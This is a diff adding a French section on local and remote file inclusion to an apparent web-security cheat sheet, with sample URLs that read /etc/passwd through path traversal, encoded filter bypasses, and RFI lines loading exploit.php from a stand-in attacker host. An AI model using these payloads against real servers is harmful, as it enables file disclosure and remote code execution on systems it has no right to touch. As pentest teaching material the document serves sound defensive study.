@@ -175,3 +175,42 @@ Le cross-site scripting (également connu sous le nom de XSS) est une vulnérabi
 **Outils:**
 * [beef-xss](https://github.com/beefproject/beef)
 * [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
+
+<br/>
+
+File Inclusion/Path traversal
+======
+**Remote File Inclusion (RFI)** : Le fichier est chargé à partir d'un serveur distant.
+**Local File Inclusion (LFI)** : Le serveur charge un fichier local.
+<br/>La vulnérabilité se produit lorsque l'utilisateur peut contrôler d'une manière ou d'une autre le fichier qui va être chargé par le serveur.
+
+<br/>
+
+* Fonctions PHP vulnérables : require, require_once, include, include_once.
+<br/>
+
+**LFI classique**
+* http://test.fr/index.php?page=../../../etc/passwd
+
+<br/>
+
+**RFI classique**
+* http://test.fr/index.php?page=http://atacker.com/exploit.php
+* http://test.fr/index.php?page=\\attacker.com\shared\exploit.php
+
+<br/>
+
+**LFI bypass**
+* http://test.fr/index.php?page=....//....//....//etc/passwd
+* http://test.fr/index.php?page=....\/....\/....\/etc/passwd
+* http://test.fr/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
+
+<br/>
+
+**Les 25 paramètres les plus vulnérables à une LFI** 
+![paramlfi](files/paramlfi.jpg)
+
+<br/>
+
+Un outil intéressant pour exploiter cette vulnérabilité : https://github.com/kurobeats/fimap
+
